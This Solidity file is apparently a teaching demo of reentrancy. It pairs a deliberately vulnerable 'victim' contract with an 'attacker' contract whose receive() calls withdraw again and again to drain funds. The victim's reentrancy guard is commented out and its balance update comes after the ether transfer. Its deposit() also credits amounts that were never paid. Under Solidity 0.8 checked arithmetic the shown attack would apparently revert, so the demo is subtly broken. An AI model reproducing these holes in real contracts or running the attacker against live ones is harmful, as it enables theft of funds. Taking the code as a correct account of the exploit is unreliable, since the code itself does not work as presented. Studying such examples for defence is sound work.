//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract victim{

    event DepositTaken(address _from, uint _amount, string _result);
    event WithdrawTaken(address _from, uint _amount, string _result);

    mapping(address => uint) public balances;

  //  bool internal mutex;
 /*   modifier noReentrant(){
        require(!mutex, "function cannot be called recursively");
        mutex = true;
        _;
        mutex = false;

    }*/
    function deposit(uint _amount) public payable{
        balances[msg.sender] += _amount;
        emit DepositTaken(msg.sender, _amount,'deposit taken');
    }
    function withdraw(uint _amount) public payable { 
        require(balances[msg.sender] >= _amount);
        //balances[msg.sender] -= _amount;    
        (bool success,) = msg.sender.call{value: _amount}("");
        require(success, "withdraw failed");
        balances[msg.sender] -= _amount;    
        //balance should be updated before transferring assets
        emit WithdrawTaken(msg.sender, _amount, "withdraw taken");
    }
    function getBalance() public view returns (uint){
        return balances[msg.sender];
    }
 
}

contract attacker{

    victim public Victim;
    
    constructor(address _victim_address) {
        Victim = victim(_victim_address);
    }

    fallback() external payable{
       // it is for interface confusions 
    }

    receive() external payable { // it is for 
        if(address(Victim).balance > 0){
            Victim.withdraw(1 ether);
        }
    }

    function attack() external payable {
       // require(msg.value > 1 ether);
        //Victim.deposit{value: 1 ether}(); 
        Victim.deposit(1 ether);
        Victim.withdraw(1 ether);
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}